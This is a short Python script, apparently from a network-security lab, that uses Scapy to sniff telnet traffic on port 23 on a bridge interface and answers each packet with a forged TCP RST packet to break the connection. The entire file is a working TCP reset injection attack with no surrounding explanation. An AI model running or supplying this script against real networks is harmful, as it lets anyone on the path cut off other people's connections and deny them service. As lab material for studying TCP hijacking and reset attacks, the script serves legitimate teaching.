#!/usr/bin/python3
# Sniff TCP connection and spoof RST packet to break the TCP connection

from scapy.all import *

def spoof_tcp(pkt):
   IPLayer  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
   TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
                  dport=pkt[TCP].sport, sport=pkt[TCP].dport)
   spoofpkt = IPLayer/TCPLayer
   ls(spoofpkt)
   send(spoofpkt, verbose=0)

pkt=sniff(iface='br-62f4ebf4c30a', filter='tcp and port 23', prn=spoof_tcp)
